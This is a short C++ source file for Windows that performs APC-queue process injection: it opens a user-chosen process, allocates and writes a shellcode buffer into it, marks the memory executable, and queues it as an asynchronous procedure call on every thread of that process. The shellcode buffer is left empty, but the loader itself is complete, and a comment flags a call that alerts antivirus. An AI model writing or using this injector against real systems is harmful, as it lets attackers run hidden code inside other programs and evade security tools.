#include <iostream>
#include <windows.h>
#include <psapi.h>
#include <tlhelp32.h>

void RunAPC(LPVOID pVirtualMem, int iProcID);

int main()
{
	DWORD dwProcList[1024];
	DWORD dwBytesWritten;
	DWORD dwOldProtect = 0;
	HANDLE hProc;
	SIZE_T bytesWritten;
	int PID, counter = 0;
	char cProcName[100];
	unsigned char shellcode[] = "";

	printf("Type PID: ");
	scanf_s("%d", &PID);
    EnumProcesses(dwProcList, sizeof(dwProcList), &dwBytesWritten);

    while(counter < (dwBytesWritten / 4)) {
		hProc = OpenProcess(PROCESS_ALL_ACCESS, 0, dwProcList[counter]);
        if (GetModuleBaseNameA(hProc, NULL, cProcName, 100)) {
			if (dwProcList[counter] == PID) {
				printf("PROCCESS NAME - %s\n", cProcName);
				LPVOID pVirtualMem = VirtualAllocEx(hProc, NULL, sizeof(shellcode), (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);
				WriteProcessMemory(hProc, pVirtualMem, shellcode, (SIZE_T)sizeof(shellcode), &bytesWritten);
				VirtualProtectEx(hProc, pVirtualMem,(SIZE_T)sizeof(shellcode), PAGE_EXECUTE_READ, &dwOldProtect);
				RunAPC(pVirtualMem,dwProcList[counter]);
			}
            CloseHandle(hProc);
        }
		counter++;
    }
}

void RunAPC(LPVOID pVirtualMem, int iProcId) {
	THREADENTRY32 thEntry;  thEntry.dwSize = sizeof(THREADENTRY32);
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0); // alert -> AV

	if (hSnapshot == INVALID_HANDLE_VALUE) {
		printf("Error Openning the function");
		CloseHandle(hSnapshot);
	}

	for (Thread32First(hSnapshot, &thEntry); Thread32Next(hSnapshot, &thEntry);) {
		if (thEntry.th32OwnerProcessID == iProcId) {
			HANDLE target_thread_handle = OpenThread(THREAD_ALL_ACCESS, NULL, thEntry.th32ThreadID);
			printf("PROC [%d] ThreadID: %d\n", thEntry.th32OwnerProcessID, thEntry.th32ThreadID);
			QueueUserAPC((PAPCFUNC)pVirtualMem, target_thread_handle, NULL);
		}
	}
	CloseHandle(hSnapshot);
}
